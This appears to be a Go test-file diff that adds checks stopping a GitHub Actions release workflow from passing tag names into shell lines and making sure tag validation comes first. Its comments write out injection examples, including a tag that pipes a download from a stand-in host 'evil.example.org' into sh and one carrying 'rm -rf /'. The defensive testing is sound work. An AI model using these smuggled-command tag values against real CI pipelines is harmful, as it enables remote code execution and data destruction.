@@ -138,3 +138,73 @@ func TestTheReleaseWorkflowPublishesTheArchiveHashes(t *testing.T) {
 		}
 	}
 }
+
+// TestTheReleaseWorkflowNeverInterpolatesIntoAShellLine is the injection this workflow
+// would otherwise carry, and it is worth stating plainly.
+//
+// `${{ … }}` is substituted by GitHub BEFORE the shell reads the line. A tag named
+//
+//	v1.0"; curl evil.example.org | sh; #
+//
+// interpolated into `make release VERSION="${{ github.ref_name }}"` becomes a command, and
+// workflow_dispatch lets anybody with write access supply one by hand. A git tag name
+// accepts almost anything, so the `on: push: tags` glob is no protection either — it
+// matches shapes, not character sets.
+//
+// Passing the value through the ENVIRONMENT closes it: a variable is data the shell
+// expands, never a line it parses.
+func TestTheReleaseWorkflowNeverInterpolatesIntoAShellLine(t *testing.T) {
+	raw, err := os.ReadFile(filepath.Clean(releaseWorkflow))
+	if err != nil {
+		t.Fatalf("lecture de %s : %v", releaseWorkflow, err)
+	}
+
+	// Walked line by line on the RAW file: codeOnly would hide nothing here, and the
+	// finding is about the literal text GitHub substitutes.
+	inRun := false
+	for number, line := range strings.Split(string(raw), "\n") {
+		trimmed := strings.TrimSpace(line)
+		switch {
+		case strings.HasPrefix(trimmed, "run:"):
+			inRun = true
+		case strings.HasPrefix(trimmed, "- name:"), strings.HasPrefix(trimmed, "- uses:"),
+			strings.HasPrefix(trimmed, "env:"), strings.HasPrefix(trimmed, "with:"):
+			inRun = false
+		}
+		if !inRun || !strings.Contains(line, "${{") {
+			continue
+		}
+		t.Errorf("release.yml ligne %d interpole une expression dans du shell :\n  %s\n"+
+			"Un nom de tag peut porter des métacaractères, et `${{ }}` est remplacé AVANT "+
+			"que le shell ne lise la ligne. Passez la valeur par env: et lisez-la comme "+
+			"une variable.", number+1, trimmed)
+	}
+}
+
+// TestTheReleaseWorkflowValidatesTheTagBeforeAnythingElse: the validation has to come
+// FIRST. Placed after the checkout it would still stop the build, but a hostile ref would
+// already have been handed to actions/checkout.
+func TestTheReleaseWorkflowValidatesTheTagBeforeAnythingElse(t *testing.T) {
+	workflow := readWorkflow(t)
+
+	validation := strings.Index(workflow, "Le nom du tag est bien une version")
+	checkout := strings.Index(workflow, "actions/checkout")
+	build := strings.Index(workflow, "make release")
+	switch {
+	case validation < 0:
+		t.Fatal("release.yml ne valide pas le nom du tag : workflow_dispatch accepte une " +
+			"chaîne arbitraire, et le filtre de tags ne couvre pas ce chemin")
+	case checkout >= 0 && validation > checkout:
+		t.Error("la validation du tag vient APRÈS le checkout : une ref hostile aurait " +
+			"déjà été remise à actions/checkout")
+	case build >= 0 && validation > build:
+		t.Error("la validation du tag vient après la construction")
+	}
+
+	// The character class is what actually refuses a metacharacter; the shape alone would
+	// accept `v1.0; rm -rf /`.
+	if !strings.Contains(workflow, `[0-9]+(\.[0-9]+){1,2}`) {
+		t.Error("la validation ne borne pas les CARACTÈRES admis : une forme de version " +
+			"seule accepterait v1.0;echo, dont la forme est correcte")
+	}
+}
